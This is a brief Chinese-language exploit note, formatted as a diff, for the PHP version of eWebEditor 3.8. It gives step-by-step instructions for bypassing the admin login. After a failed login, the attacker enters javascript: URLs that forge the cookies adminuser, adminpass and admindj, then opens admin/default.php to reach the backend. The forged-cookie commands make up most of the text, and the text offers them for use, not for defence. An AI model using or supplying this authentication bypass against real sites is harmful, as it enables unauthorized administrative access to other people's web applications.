@@ -1,0 +1,4 @@
+php版ewebeditor 3.8的漏洞
+php版本后台是调用../ewebeditor/admin/config.php,大家去看下源码就知道，在这里我说说利用方法:
+1 首先当然要找到登陆后台,默认是../eWebEditor/admin/login.php,进入后台后随便输入一个用户和密码,当然会提示出错了,必须是出错的时候，然后这时候你清空浏览器的url,然后输入 javascript:alert(document.cookie=”adminuser=”+escape(”admin”)); javascript:alert(document.cookie=”adminpass=”+escape(”admin”)); javascript:alert(document.cookie=”admindj=”+escape(”1″));后三次回车,
+2 然后输入正常情况才能访问的文件../ewebeditor/admin/default.php就可以进后台了
